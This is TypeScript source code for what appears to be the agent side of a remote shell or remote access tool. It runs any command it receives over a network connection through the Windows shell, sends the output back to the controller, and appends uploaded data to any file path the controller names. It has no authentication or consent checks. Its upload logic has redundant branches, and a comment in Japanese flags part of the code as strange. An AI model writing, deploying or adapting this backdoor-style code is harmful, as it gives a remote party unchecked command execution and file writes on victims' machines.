import { id, target } from "./targetMain"
import {exec} from "child_process"
import * as fs from "fs"
import Encoding from  'encoding-japanese'
import { createSendData } from "../functions/createSendData"

let runCmdList:string[] = []
let oneTimeData:any[] = []
export let startUpload:boolean = false
let ulFileName:string = ""
let ulFileMax:number = 0
let ulFilePath:string = ""
let ulFileNowSize:number = 0

let nowSize:number = 0
export const getSendData = async(data:string)=>{
    if(!startUpload){
        const getData = JSON.parse(data)
        if(getData.type === "sendCmd"){
            console.log(getData.data[0])
            const cmdList:string[] = getData.data[0].split(" ")
            let runCmd:string = "chcp 65001  &"
            runCmdList.forEach((i,index)=>{//ここおかしい

                runCmd+=`${i} & `
            })
            runCmd+=`${getData.data[0]}`
            exec(runCmd,{encoding:'utf-8'},(error: any, stdout: any, stderr: any)=>{
                if(!error && !stderr){
                    const sendData = JSON.stringify(createSendData("cmdResoult",[getData.data[1],stdout]))
                    target.write(sendData)
                    if(cmdList[0] == "cd"){
                        runCmdList.push(getData.data[0])
                    }
                }else{
                    const sendData = JSON.stringify(createSendData("cmdResoult",[getData.data[1],stderr]))
                    target.write(sendData)
                }
            })

        }else if(getData.type === "startUpload"){
            startUpload = true
            ulFileName = getData.data[0]
            ulFileMax = getData.data[1]
            ulFilePath = getData.data[2]
            console.log(ulFileMax,ulFileName,ulFilePath,getData.data[2])
        }
    }else{
        console.log("start")
        oneTimeData.push(data)
        const can = Buffer.concat(oneTimeData)
        ulFileNowSize = Buffer.concat(oneTimeData).length
        console.log(ulFilePath)
        if(ulFileNowSize>=100000){
            oneTimeData = []
            await fs.writeFileSync(`${ulFilePath}`,can,{flag:'a'})
            console.log("done")
        }else if(ulFileNowSize <=can.length){
            oneTimeData = []
            await fs.writeFileSync(`${ulFilePath}`,can,{flag:'a'})
            console.log("done")
        }else{
            oneTimeData = []
            await fs.writeFileSync(`${ulFilePath}`,can,{flag:'a'})
            console.log("done")
        }
    }
}
